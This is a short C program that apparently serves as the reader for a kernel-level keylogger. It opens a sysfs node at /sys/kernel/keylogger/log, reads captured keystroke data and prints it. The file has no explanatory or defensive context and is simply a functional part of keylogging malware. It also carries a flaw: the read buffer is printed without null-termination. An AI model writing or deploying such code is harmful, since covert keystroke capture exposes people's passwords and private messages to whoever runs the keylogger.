#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#define BUFFER_SIZE 1024
int main(int argc, char** argv)
{
	int file;
	char buffer[BUFFER_SIZE];
		
	// the nod in /sys
	file=open("/sys/kernel/keylogger/log",O_RDWR);
	//open the file or error
	if (file == -1){ perror("FILE ERROR: ");return -1;}

	//read the data from kernel log file and print it 					
	read(file, buffer, sizeof(buffer));  
	printf("keylogger data %s\n" , buffer);
	close(file); 	
}

